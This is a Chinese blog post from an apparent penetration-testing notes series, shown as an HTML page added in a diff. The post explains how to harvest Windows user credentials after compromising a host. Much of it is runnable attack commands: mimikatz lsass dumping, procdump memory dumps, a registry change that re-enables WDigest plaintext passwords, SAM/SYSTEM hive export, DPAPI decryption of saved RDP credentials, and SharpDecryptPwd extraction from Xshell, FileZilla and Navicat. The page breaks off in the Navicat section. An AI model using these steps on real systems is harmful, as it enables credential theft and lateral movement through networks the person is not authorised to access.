@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>用户凭据收集 - v2ish1yan`s blog</title>
+
+  
+    <meta name="description" content="内网渗透体系建设笔记-用户凭据收集">
+<meta property="og:type" content="article">
+<meta property="og:title" content="用户凭据收集">
+<meta property="og:url" content="http://example.com/2023/07/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%953/index.html">
+<meta property="og:site_name" content="v2ish1yan&#96;s blog">
+<meta property="og:description" content="内网渗透体系建设笔记-用户凭据收集">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212302142776.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212302228410.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212312301405.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011111978.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011145261.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011201712.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011210434.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011215842.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011236435.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011546308.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011548947.png">
+<meta property="article:published_time" content="2023-07-03T08:36:07.865Z">
+<meta property="article:modified_time" content="2023-07-03T08:36:07.918Z">
+<meta property="article:author" content="v2ish1yan">
+<meta property="article:tag" content="信息搜集">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212302142776.png">
+  
+  
+  
+  <meta name="keywords" content="信息搜集">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120002492.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120001591.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">v2ish1yan`s blog</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/links/">友链</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">用户凭据收集</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96lsass%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98"><span class="toc-text">在线读取lsass进程内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96lsass%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6"><span class="toc-text">离线读取lsass内存文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0SAM%E6%96%87%E4%BB%B6"><span class="toc-text">在线读取本地SAM文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0SAM%E6%96%87%E4%BB%B6"><span class="toc-text">离线读取本地SAM文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96RDP%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-text">获取RDP保存的凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Xshell%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-text">获取Xshell保存的凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96FielZilla%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-text">获取FielZilla保存的凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96NaviCat%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-text">获取NaviCat保存的凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%9D%E5%AD%98%E7%9A%84%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE"><span class="toc-text">获取浏览器保存的登录凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96WinSCP%E4%BF%9D%E7%95%99%E7%9A%84%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE"><span class="toc-text">获取WinSCP保留的登录凭据</span></a></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-07-03T08:36:07.865Z">2023-07-03</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>用户凭据收集</span></h1>
+<blockquote>
+<p>在内网渗透中，在拿到某台机器的控制权后，会以被攻陷的主机作为跳板进行横向渗透，但是在横向渗透过程中很多攻击方式都需要获取到域内用户的密码或哈希值才能进行</p>
+</blockquote>
+<h1 id="获取域内单机密码和哈希值"><a href="#获取域内单机密码和哈希值" class="headerlink" title="获取域内单机密码和哈希值"></a>获取域内单机密码和哈希值</h1><p>windows中SAM文件是windows用户的账户数据库，位于<code>%SYstemRoot%\System32\Config</code>,保存了用户名和密码哈希值</p>
+<p>lsass.exe是windows的一个系统进程，用于实现系统的安全机制，主要用于本地安全和登录策略。通常情况下，用户输入密码登录后，登录的域名、用户名和登录的域名、用户名和登录凭据等信息会存储在lsass.exe的进程空间中，用户的明文密码进过WDigest和Tspkg模块调用后，会对其使用可逆的算法进行加密并存储在内存中</p>
+<p>用来获取主机的用户密码和哈希值的工具有很多，大多数都是读取SAm文件或者访问lsass.exe进程的内存数据等操作实现的，但是会涉及到提权操作</p>
+<p>下面使用<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>来获取用户凭证</p>
+<h2 id="在线读取lsass进程内存"><a href="#在线读取lsass进程内存" class="headerlink" title="在线读取lsass进程内存"></a>在线读取lsass进程内存</h2><p>将mimikatz.exe上传到目标主机</p>
+<p>用管理员权限打开mimikatz.exe</p>
+<p>然后执行以下命令获取用户凭证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug <span class="comment">#获取debug特权</span></span><br><span class="line">sekurlsa::logonpasswords full <span class="comment">#导出用户凭证</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212302142776.png" alt="image-20221230214222718" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221230214222718</span></div></div>
+
+<h2 id="离线读取lsass内存文件"><a href="#离线读取lsass内存文件" class="headerlink" title="离线读取lsass内存文件"></a>离线读取lsass内存文件</h2><p>除了在线读取，也可以直接将lsass.exe的进程内存转储，将内存文件导出到本地后，使用mimikatz进行离线读取</p>
+<p>有多个转储进程内存的工具，如OutMinidump.ps1、Procdump、SharpDump等</p>
+<p>下面使用微软官方的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>工具</p>
+<p>先将工具上传到目标主机</p>
+<p>要使用管理员权限，执行以下命令将lsass.exe的进程转储</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-accepteula 命令行选项自动接受 Sysinternals 许可协议</span><br><span class="line">-ma 完整转储</span><br></pre></td></tr></table></figure>
+
+<p>然后使用mimikatz来导出用户凭证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lass.dmp <span class="comment">#加载内存文件</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>，微软在2014奶奶5月发布了KB2871997补丁，关闭了WDigest功能，禁止从内存中获取明文，且在Windows Server 2012及以上版本默认关闭了WDigest功能。但是可以通过修改注册表来重新开启WDigest功能，用户注销或者重新登录后就能获取到用户的明文密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启WDigest</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"><span class="comment">#关闭WDigest</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<p>开启后成功获取明文密码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212302228410.png" alt="image-20221230222835344" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221230222835344</span></div></div>
+
+<h2 id="在线读取本地SAM文件"><a href="#在线读取本地SAM文件" class="headerlink" title="在线读取本地SAM文件"></a>在线读取本地SAM文件</h2><p>还是利用mimikatz</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug <span class="comment">#提升至DebugPrivilege权限</span></span><br><span class="line">token::elevate <span class="comment">#提升至SYSTEM权限</span></span><br><span class="line">lsadump::sam <span class="comment"># 读取本地SAM文件</span></span><br></pre></td></tr></table></figure>
+
+<p>读取Sam文件中保存的用户登录凭证，可以导出当前系统中所以本地用户的哈希值</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212312301405.png" alt="image-20221231225858755" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221231225858755</span></div></div>
+
+<h2 id="离线读取本地SAM文件"><a href="#离线读取本地SAM文件" class="headerlink" title="离线读取本地SAM文件"></a>离线读取本地SAM文件</h2><p>离线读取就是先将SAM文件导出，在使用mimikatz加载并读取其中的用户凭据等。<strong>注意</strong>，为了提高SAM文件的安全性以防止离线破解，Windows会对SAM文件使用密钥进行加密，这个密钥存储在SYSTEM文件中，与SAM文件在同一个目录下</p>
+<p>首先，导出SAM和SYSTEM文件。因为系统在运行时，这两个文件是被锁定的，所以需要借助一些工具来实现，而<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>项目中提供的<code>Invoke-NinjaCopy.ps1</code>脚本可以完成这项工作</p>
+<p>要先将这个项目文件夹上传的目标主机，如果直接<code>Import-Module PowerSploit</code>的话会报错<code>xxx禁止执行脚本</code>,所以要先执行以下命令，然后再<code>Import-Module PowerSploit</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-ExecutionPolicy</span> RemoteSigned</span><br><span class="line">Y</span><br></pre></td></tr></table></figure>
+
+<p>然后执行命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> PowerSploit</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\Windows\System32\config\SAM&quot;</span> <span class="literal">-LocalDestination</span> C:\USers\Petter\Desktop\SAM</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\Windows\System32\config\SYSTEM&quot;</span> <span class="literal">-LocalDestination</span> C:\USers\Petter\Desktop\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<p>【还可以通过HiveNightmare提权漏洞（CVE-2021-36934)来读取SAM和SYSTEM】</p>
+<p>也可以在管理器权限下执行以下命令，通过保存注册表的方式导出</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM sam.hive</span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br></pre></td></tr></table></figure>
+
+<p>然后将导出的SAM和SYSTEM文件用mimikatz加载并读取SAM中的用户凭证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:&lt;导出的SAM文件&gt; /system:&lt;导出的SYSTEM文件&gt;</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011111978.png" alt="image-20230101111131891" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230101111131891</span></div></div>
+
+<hr>
+<h1 id="获取常见应用软件凭据"><a href="#获取常见应用软件凭据" class="headerlink" title="获取常见应用软件凭据"></a>获取常见应用软件凭据</h1><p>一些特定的应用程序可以存储面，以方便用户的管理和维护，入Xmanager、TeamViewer、FileZilla、NaviCat和各种浏览器等。通过对保存的用户凭证进行导出和解密，通常可以获取登录内网服务器和各种管理后台的账户密码，可以通过他们进行横向移动和访问受限资源</p>
+<h2 id="获取RDP保存的凭据"><a href="#获取RDP保存的凭据" class="headerlink" title="获取RDP保存的凭据"></a>获取RDP保存的凭据</h2><p>为了避免每次连接服务器都进行身份验证，经常使用RDP远程桌面连接远程服务器的用户可能勾选保存连接凭据，以便快速的身份验证。这些凭据都使用数据保护API以加密形式存储在Windows的凭据管理器中，路径为<code>%USERPROFILE%\AppData\Local\Microsofg\Credentials</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011145261.png" alt="image-20230101114512209" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230101114512209</span></div></div>
+
+<p>执行以下命令，可以查看当前主机上保存的所有连接凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list <span class="comment">#查看当前保存的凭据</span></span><br><span class="line"><span class="built_in">dir</span> /a %USERPROFILE%\AppData\Local\Microsofg\Credentials\* <span class="comment">#遍历Credentials目录下保存的凭据</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011201712.png" alt="image-20230101120100667" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230101120100667</span></div></div>
+
+<p>凭据是加密的，可以使用Mimikatz导出指定的RDP连接凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\9824FAA65DEB4F4601E970E6EB97754F</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011210434.png" alt="image-20230101121013379" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230101121013379</span></div></div>
+
+<p>pbDate就是凭据的加密数据，guidMasterKey是该凭据的GUID，记录guidMasterKey的值</p>
+<p>然后用mimikatz执行以下命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::dapi</span><br></pre></td></tr></table></figure>
+
+<p>找到与guidMasterKey相关联的MasterKey，就是加密凭据使用的密钥</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011215842.png" alt="image-20230101121508791" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230101121508791</span></div></div>
+
+<p>记录这个值，最后执行以下命令，来破解凭据文件，得到RDP明文凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\9824FAA65DEB4F4601E970E6EB97754F /masterkey:16f7b6bceba157b229b69aa4b19c70284f91f95ad53fd9c94dc29bb4eeea0de64175689a3830e8023ce6e6e6f58f26929e5b995b2dcb50a3942f11d665e870cd</span><br></pre></td></tr></table></figure>
+
+<p>得到明文凭据，这个也是那个主机的密码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011236435.png" alt="image-20230101123644396" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230101123644396</span></div></div>
+
+<h2 id="获取Xshell保存的凭据"><a href="#获取Xshell保存的凭据" class="headerlink" title="获取Xshell保存的凭据"></a>获取Xshell保存的凭据</h2><p>Xhell是强大的终端模拟软件，指出ssh1，ssh2和Microsoft的TELNET协议，Xshell可以在windows下访问远端不同系统下的服务器</p>
+<p>Xshell会将服务器连接信息保存在Session目录下的.xsh文件中，如果用户勾选了“记住用户名&#x2F;密码”，该文件会保存远程服务器连接的用户名和经过加密后的密码</p>
+<table>
+<thead>
+<tr>
+<th>Xshell版本</th>
+<th>.xsh文件路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Xshell5</td>
+<td>%USERPROFILE%\Documents\NetSarang\Xshell\Session</td>
+</tr>
+<tr>
+<td>Xshell6</td>
+<td>%USERPROFILE%\Documents\NetSarang Computer\6\Xshell\Session</td>
+</tr>
+<tr>
+<td>Xshell7</td>
+<td>%USERPROFILE%\Documents\NetSarang Computer\7\Xshell\Session</td>
+</tr>
+</tbody></table>
+<p>Xshell7前的版本，可以使用<a target="_blank" rel="noopener" href="https://github.com/RowTeam/SharpDecryptPwd">RowTeam&#x2F;SharpDecryptPwd</a>|<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpDecryptPwd">uknowsec&#x2F;SharpDecryptPwd</a>工具进行解密，包括以下产品</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd Navicat</span><br><span class="line">SharpDecryptPwd Xmanager</span><br><span class="line">SharpDecryptPwd TeamViewer</span><br><span class="line">SharpDecryptPwd FileZilla</span><br><span class="line">SharpDecryptPwd Foxmail</span><br><span class="line">SharpDecryptPwd TortoiseSVN</span><br><span class="line">SharpDecryptPwd WinSCP</span><br><span class="line">SharpDecryptPwd Chrome</span><br><span class="line">SharpDecryptPwd RDCMan</span><br><span class="line">SharpDecryptPwd SunLogin</span><br></pre></td></tr></table></figure>
+
+<p>将这个上传到目标主机，执行命令，可以获取Xshell保存的所有连接凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe -Xmanagager -p <span class="string">&quot;%USERPROFILE%\Documents\NetSarang\Xshell\Session&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p> Xshell7后的版本，Sesssion目录中不载存储用户密码，用上述方法获取的密码为一串乱码，只能使用星号密码查看器直接查看密码</p>
+<h2 id="获取FielZilla保存的凭据"><a href="#获取FielZilla保存的凭据" class="headerlink" title="获取FielZilla保存的凭据"></a>获取FielZilla保存的凭据</h2><p>Fielzilla是一个FTP客户端软件，会将FTP登录凭据以BASE64密文的格式保存在<code>%USERPROFILE%\Roaming\FileZilla\recentservers.xml</code>中</p>
+<p>可以直接看，也可以用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe  -FileZilla</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取NaviCat保存的凭据"><a href="#获取NaviCat保存的凭据" class="headerlink" title="获取NaviCat保存的凭据"></a>获取NaviCat保存的凭据</h2><p>NaviCat是一个强大的数据库管理和设计工具</p>
+<p>当用户连接数据库时，需要填写相关信息，如IP、用户名、密码等，用户选择保存密码（默认勾选）后，NaviCat会将这些信息保存到注册表中</p>
+<table>
+<thead>
+<tr>
+<th>数据库类型</th>
+<th>凭据存储路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\</td>
+</tr>
+<tr>
+<td>MariaDB</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\</td>
+</tr>
+<tr>
+<td>MicrosoftSQL</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\</td>
+</tr>
+</tbody></table>
+<p>Navicat&lt;&#x3D;11 密码的键为”pwd”</p>
+<p>Navicat&gt;&#x3D;12 密码的键为”Password”</p>
+<p>使用以下命令可以导出当前主机上用户连接过的所以数据库的登录凭据</p>
